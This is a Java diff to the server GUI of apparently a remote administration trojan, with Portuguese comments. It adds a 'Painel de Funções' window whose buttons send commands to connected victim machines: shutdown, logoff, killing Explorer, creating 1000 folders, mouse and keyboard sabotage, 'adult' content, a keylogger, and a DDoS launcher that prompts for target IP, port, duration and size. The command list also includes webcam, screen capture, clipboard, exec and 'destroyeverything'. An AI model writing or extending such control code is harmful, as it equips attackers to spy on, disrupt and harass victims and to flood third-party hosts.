@@ -47,10 +47,10 @@ public class ServerGUI extends JFrame {
 
     // Todos os comandos para autocomplete
     private static final String[] ALL_COMMANDS = {
-            "sel", "list", "help", "desel", "control", "mouse", "mousemove", "mousemoveclick", "keyboard", "duplicate", "fps", "ddos", "wallpaper", "functions",
-            "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "view", "receive", "send", "destroyeverything",
-            "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen", "webcam", "livestopper",
-            "cmd", "exec", "log", "kill", "listprocess", "clipboard", "msg", "ask", "chat", "voice", "update", "close", "uninstall"
+            "sel", "list", "help", "desel", "control", "mouse", "mousemove", "mousemoveclick", "keyboard", "duplicate", "fps", "ddos", "wallpaper",
+            "functions", "functionspanel", "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "view", "receive",
+            "send", "destroyeverything", "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen",
+            "webcam", "livestopper", "cmd", "exec", "log", "kill", "listprocess", "clipboard", "msg", "ask", "chat", "voice", "update", "close", "uninstall"
     };
 
     // Componentes principais
@@ -314,8 +314,8 @@ public class ServerGUI extends JFrame {
         // Reproduzir voz (voice texto)
         messagesPanel.add(createInputActionButton("Reproduzir Voz", "voice", "Digite o texto:"));
 
-        // Keylogger (keylogger)
-        messagesPanel.add(createSimpleActionButton("Keylogger", "keylogger"));
+        // Funções (functionspanel)
+        messagesPanel.add(createSimpleActionButton("Funções", "functionspanel"));
 
         // ------------------------------------------------------------
         // Subpainel: MOUSE / TECLADO
@@ -1125,6 +1125,183 @@ public class ServerGUI extends JFrame {
 
         AUDIO_CONTROL.setVisible(true);
         return AUDIO_CONTROL;
+    }
+
+    public JFrame functionsControlPanel() {
+        try {
+            // Definir LookAndFeel Nimbus (pode ajustar ou remover conforme necessidade)
+            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
+
+            if (DARK_MODE) {
+                // Ajustes de cor para o modo escuro via UIManager
+                UIManager.put("control", new Color(60, 63, 65));
+                UIManager.put("text", Color.WHITE);
+                UIManager.put("nimbusBase", new Color(18, 30, 49));
+                UIManager.put("nimbusFocus", new Color(115, 164, 209));
+                UIManager.put("nimbusLightBackground", new Color(60, 63, 65));
+                UIManager.put("info", new Color(60, 63, 65));
+                UIManager.put("nimbusSelectionBackground", new Color(104, 93, 156));
+                UIManager.put("nimbusSelectedText", Color.WHITE);
+                UIManager.put("nimbusDisabledText", Color.GRAY);
+                UIManager.put("OptionPane.background", new Color(60, 63, 65));
+                UIManager.put("Panel.background", new Color(60, 63, 65));
+                UIManager.put("TextField.background", new Color(69, 73, 74));
+                UIManager.put("TextField.foreground", Color.WHITE);
+                UIManager.put("TextArea.background", new Color(69, 73, 74));
+                UIManager.put("TextArea.foreground", Color.WHITE);
+                UIManager.put("ComboBox.background", new Color(69, 73, 74));
+                UIManager.put("ComboBox.foreground", Color.WHITE);
+                UIManager.put("Button.background", new Color(77, 77, 77));
+                UIManager.put("Button.foreground", Color.WHITE);
+            }
+        } catch (Exception ignored) {
+        }
+
+        // Se quiser reaproveitar uma variável global, substitua "frame" por ela
+        JFrame frame = new JFrame("Painel de Funções");
+        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+
+        // Ícone (opcional, caso queira manter consistência com seu outro frame)
+        try {
+            ImageIcon icon = new ImageIcon(getClass().getResource("/eye.png"));
+            frame.setIconImage(icon.getImage());
+        } catch (Exception ignored) {
+        }
+
+        // Painel principal
+        JPanel panel = new JPanel(new FlowLayout(FlowLayout.CENTER, 20, 20));
+
+        // -------------------------------------------------
+        // Botão de Liberar Memória (mantendo o "design" atual)
+        // -------------------------------------------------
+        JButton gcButton = new JButton("Liberar Memória");
+        // Se você tiver cor definida no anterior, coloque aqui
+        // Exemplo de cor (caso queria manter o design):
+        // gcButton.setBackground(Color.LIGHT_GRAY);
+
+        gcButton.addActionListener(e -> {
+            // Envia o comando gc pelo método que você já tem
+            ServerGUI.sendDirectCommand("gc");
+        });
+        panel.add(gcButton);
+
+        // -------------------------------------------------
+        // Botões solicitados
+        // -------------------------------------------------
+
+        // Desligar
+        JButton shutdownButton = new JButton("Desligar");
+        shutdownButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions shutdown"));
+        panel.add(shutdownButton);
+
+        // Reiniciar
+        JButton restartButton = new JButton("Reiniciar");
+        restartButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions restart"));
+        panel.add(restartButton);
+
+        // Logoff
+        JButton logoffButton = new JButton("Logoff");
+        logoffButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions logoff"));
+        panel.add(logoffButton);
+
+        // 1000 Pastas
+        JButton mkdirsButton = new JButton("1000 Pastas");
+        mkdirsButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions mkdirs"));
+        panel.add(mkdirsButton);
+
+        // Área de Trabalho
+        JButton desktopButton = new JButton("Área de Trabalho");
+        desktopButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions desktop"));
+        panel.add(desktopButton);
+
+        // Matar Explorer
+        JButton killExplorerButton = new JButton("Matar Explorer");
+        killExplorerButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions killexplorer"));
+        panel.add(killExplorerButton);
+
+        // Abrir Explorer
+        JButton openExplorerButton = new JButton("Abrir Explorer");
+        openExplorerButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions explorer"));
+        panel.add(openExplorerButton);
+
+        // Stress
+        JButton stressButton = new JButton("Stress");
+        stressButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions stress"));
+        panel.add(stressButton);
+
+        // Adulto
+        JButton adultButton = new JButton("Adulto");
+        adultButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions adult"));
+        panel.add(adultButton);
+
+        // Rickroll
+        JButton rickrollButton = new JButton("Rickroll");
+        rickrollButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions rickroll"));
+        panel.add(rickrollButton);
+
+        // Beep
+        JButton beepButton = new JButton("Beep");
+        beepButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions beep"));
+        panel.add(beepButton);
+
+        // Bug de Mouse
+        JButton mouseBugButton = new JButton("Bug de Mouse");
+        mouseBugButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions mousebug"));
+        panel.add(mouseBugButton);
+
+        // Bug de Teclado
+        JButton keyboardBugButton = new JButton("Bug de Teclado");
+        keyboardBugButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions keyboardbug"));
+        panel.add(keyboardBugButton);
+
+        // Wallpaper (pede nome de arquivo ao usuário)
+        JButton wallpaperButton = new JButton("Wallpaper");
+        wallpaperButton.addActionListener(e -> {
+            String fileName = JOptionPane.showInputDialog(
+                    frame,
+                    "Digite o nome do arquivo para usar como wallpaper:"
+            );
+            if (fileName != null && !fileName.trim().isEmpty()) {
+                ServerGUI.sendDirectCommand("wallpaper " + fileName);
+            }
+        });
+        panel.add(wallpaperButton);
+
+        // DDOS (pede IP, porta, tempo em seg. e tamanho)
+        JButton ddosButton = new JButton("DDOS");
+        ddosButton.addActionListener(e -> {
+            // Você pode fazer 4 diálogos separados, ou 1 só com espaço.
+            // Aqui estão 4 diálogos para maior clareza:
+            String ip = JOptionPane.showInputDialog(frame, "Endereço IP:");
+            if (ip == null) return;
+
+            String porta = JOptionPane.showInputDialog(frame, "Porta:");
+            if (porta == null) return;
+
+            String tempo = JOptionPane.showInputDialog(frame, "Tempo em segundos:");
+            if (tempo == null) return;
+
+            String tamanho = JOptionPane.showInputDialog(frame, "Tamanho:");
+            if (tamanho == null) return;
+
+            ServerGUI.sendDirectCommand("ddos " + ip + " " + porta + " " + tempo + " " + tamanho);
+        });
+        panel.add(ddosButton);
+
+        // Keylogger
+        JButton keyloggerButton = new JButton("Keylogger");
+        keyloggerButton.addActionListener(e -> ServerGUI.sendDirectCommand("keylogger"));
+        panel.add(keyloggerButton);
+
+        // -------------------------------------------------
+        // Configurações finais da janela
+        // -------------------------------------------------
+        frame.setContentPane(panel);
+        frame.pack();
+        frame.setLocationRelativeTo(null);
+        frame.setVisible(true);
+
+        return frame;
     }
 
     public static void updateClientTable(String uniqueId, BufferedImage screenPreview, BufferedImage webcamPreview, String clientName, String ip, String installDate, String location, String os, int webcams, int monitors, long ping, String activeWindow) {
